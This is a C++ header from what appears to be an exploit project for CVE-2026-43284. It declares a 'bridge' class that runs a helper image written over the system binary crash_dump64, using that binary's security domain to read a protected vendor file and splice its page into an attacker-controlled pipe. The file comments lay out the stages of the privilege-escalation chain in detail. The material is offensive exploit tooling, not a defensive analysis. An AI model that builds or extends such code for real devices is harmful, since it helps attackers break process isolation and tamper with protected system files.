#pragma once
/** @file backend/cve_2026_43284/landing/crash_dump_bridge.hpp
 *  The two bridges a carrier this process cannot open needs.
 *
 *  Why they exist: patch #2's target is a vendor file, and an unprivileged process cannot open it --
 *  which leaves both halves of the write stuck, because the block the vector is derived from has to
 *  be read from that file and the ciphertext slot has to be spliced from its page. Patch #1 solves
 *  both at once: the helper image is written over the first blocks of crash_dump64, and executing
 *  that file then runs the helper in the crash_dump domain, where the vendor file is readable. The
 *  helper takes {offset, path} and writes sixteen bytes of the file at that offset to its standard
 *  output -- and its standard output has to be a pipe, because it splices the page rather than
 *  copying it. Both are measured on the device; the retired chain's call is kept verbatim.
 *
 *  So this class is one primitive with two uses: run the patched helper with its output on a pipe of
 *  ours and read the block back (the preimage), or run it with its output on the datagram pipe and
 *  let it splice the page there itself (the ciphertext). Both are the same exec with a different
 *  standard output, which is why they are one class and not two.
 *
 *  Hidden rather than implied: the helper path is the file patch #1 patched; a caller that never ran
 *  patch #1 gets an exec of a stock crash_dump64, whose output is not a page, so this class refuses
 *  until it is told the patch went in. Nothing here decides that; the caller does, and the outcome
 *  says which call failed.
 *
 *  Lifetime: the two paths are copied in, nothing is opened, and every call forks a helper that exits
 *  on its own -- so a bridge can be constructed before the route is up and used only while it is.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43284/landing/real_splice_io.hpp"

namespace ghostlock::backend::cve_2026_43284::landing {
    /** How long a path this bridge will hold, including its terminator. */
    inline constexpr std::size_t kBridgePathBytes = 256U;

    /** The bridge. See the file note for what it stands in for. */
    class CrashDumpBridge final {
      public:
        /** How the last call ended. */
        enum class Outcome : unsigned char {
            Never = 0,
            Ok = 1,
            /** bind() was never called, or refused a path. */
            NotBound = 2,
            PipeFailed = 3,
            SpawnFailed = 4,
            /** The helper returned fewer bytes than a block. */
            ShortRead = 5,
            /** The helper exited non-zero, so what it wrote is not a whole block. */
            HelperFailed = 6,
        };

        CrashDumpBridge() noexcept = default;
        CrashDumpBridge(const CrashDumpBridge &) = delete;
        CrashDumpBridge &operator=(const CrashDumpBridge &) = delete;

        /**
         *  Bind the patched helper and the carrier it reads.
         *
         *  @param helper_path  The file patch #1 wrote the helper image into.
         *  @param helper_bytes Its length, terminator excluded. A path of zero bytes, one that does
         *                      not fit kBridgePathBytes, or a path with a control character is
         *                      refused: these strings become argv, and a truncated argv is a
         *                      different command.
         *  @param carrier_path The vendor file the helper reads.
         *  @param carrier_bytes Its length, under the same rule.
         *  @return True when both paths were accepted. Nothing is executed here.
         */
        [[nodiscard]] bool bind(const char *helper_path, std::size_t helper_bytes,
                                const char *carrier_path, std::size_t carrier_bytes) noexcept;

        [[nodiscard]] bool bound() const noexcept { return bound_; }

        /** The preimage source: sixteen bytes of the carrier, read through the helper. */
        [[nodiscard]] OldPageSource old_page() noexcept {
            return OldPageSource{this, &CrashDumpBridge::read16};
        }
        /** The ciphertext source: the helper splices the carrier's page into the datagram pipe. */
        [[nodiscard]] HelperWriteSource helper() noexcept {
            return HelperWriteSource{this, &CrashDumpBridge::splice16};
        }

        [[nodiscard]] Outcome last_outcome() const noexcept { return outcome_; }
        /** The wait status of the last helper, for the report. */
        [[nodiscard]] int last_status() const noexcept { return last_status_; }

      private:
        /** One block, read back through the helper. */
        static long read16(void *ctx, std::uint64_t offset,
                           std::uint8_t out[kBlockBytes]) noexcept;
        /** One block, spliced by the helper into the caller's pipe. */
        static long splice16(void *ctx, int pipe_write_fd, std::uint64_t offset) noexcept;

        /** The one exec both uses share. @p sink_stdout is where the block must come out. */
        [[nodiscard]] long run(std::uint64_t offset, int sink_stdout, std::uint8_t *out) noexcept;

        char helper_[kBridgePathBytes] = {};
        char carrier_[kBridgePathBytes] = {};
        bool bound_ = false;
        Outcome outcome_ = Outcome::Never;
        int last_status_ = 0;
    };
}  // namespace ghostlock::backend::cve_2026_43284::landing
